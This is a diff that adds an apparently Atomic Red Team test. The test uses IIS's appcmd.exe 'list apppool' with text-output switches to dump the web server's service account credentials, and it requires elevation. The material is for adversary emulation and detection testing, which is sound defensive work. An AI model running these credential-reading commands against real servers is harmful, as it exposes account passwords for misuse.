@@ -104,4 +104,23 @@ atomic_tests:
       Remove-Item $env:TEMP\svchost-exe.dmp -ErrorAction Ignore
     name: powershell
     elevation_required: true
-
+- name: Retrieve Microsoft IIS Service Account Credentials Using AppCmd
+  auto_generated_guid: 6c7a4fd3-5b0b-4b30-a93e-39411b25d889
+  description: |-
+   AppCmd.exe is a command line utility which is used for managing an IIS web server. The list command within the tool reveals the service account credentials configured for the webserver. An adversary may use these credentials for other malicious purposes.
+   [Reference](https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA)
+  supported_platforms:
+  - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: IIS must be installed prior to running the test
+    prereq_command: if ((Get-WindowsFeature Web-Server).InstallState -eq "Installed") {exit 0} else {exit 1}
+    get_prereq_command: |-
+      Install-WindowsFeature -name Web-Server -IncludeManagementTools
+  executor:
+    command: |-
+      C:\Windows\System32\inetsrv\appcmd.exe list apppool /@t:*
+      C:\Windows\System32\inetsrv\appcmd.exe list apppool /@text:*
+      C:\Windows\System32\inetsrv\appcmd.exe list apppool /text:*
+    name: powershell
+    elevation_required: true
